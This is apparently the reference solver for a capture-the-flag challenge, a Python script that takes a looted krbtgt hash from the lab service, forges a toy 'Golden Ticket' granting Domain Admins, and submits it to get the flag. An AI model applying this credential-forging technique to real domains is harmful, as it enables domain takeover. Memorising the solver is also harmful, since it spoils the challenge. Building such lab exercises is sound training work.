"""Reference solver for goldenticket: forge a Golden Ticket with the krbtgt key.

    python3 solve.py <host> <port>

Loot the dumped krbtgt hash, forge a ticket for a Domain Admin principal sealed
under that key, and present it to /resource for the flag.
"""
import hashlib
import json
import sys
import urllib.parse
import urllib.request

TICKET_MAGIC = "KRB5-TGT-v1"


def keystream(key, n):
    out = bytearray(); c = 0
    while len(out) < n:
        out += hashlib.sha256(key + b"|" + str(c).encode()).digest(); c += 1
    return bytes(out[:n])


def seal(body, key_hex):
    raw = json.dumps(body, sort_keys=True).encode()
    ks = keystream(bytes.fromhex(key_hex), len(raw))
    return bytes(a ^ b for a, b in zip(raw, ks)).hex()


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"

    def get(path):
        return json.loads(urllib.request.urlopen(base + path, timeout=15).read())

    # 1. loot the krbtgt key (dumped from an earlier compromise)
    krbtgt = get("/loot/krbtgt_hash")["nthash"]

    # 2. forge a Golden Ticket: any principal, Domain Admins group
    ticket = seal({"magic": TICKET_MAGIC, "user": "Administrator",
                   "groups": ["Domain Users", "Domain Admins"]}, krbtgt)

    # 3. present it
    out = get("/resource?ticket=" + urllib.parse.quote(ticket))
    print(f"[+] krbtgt key: {krbtgt}")
    print(out.get("flag") or out)


if __name__ == "__main__":
    main()
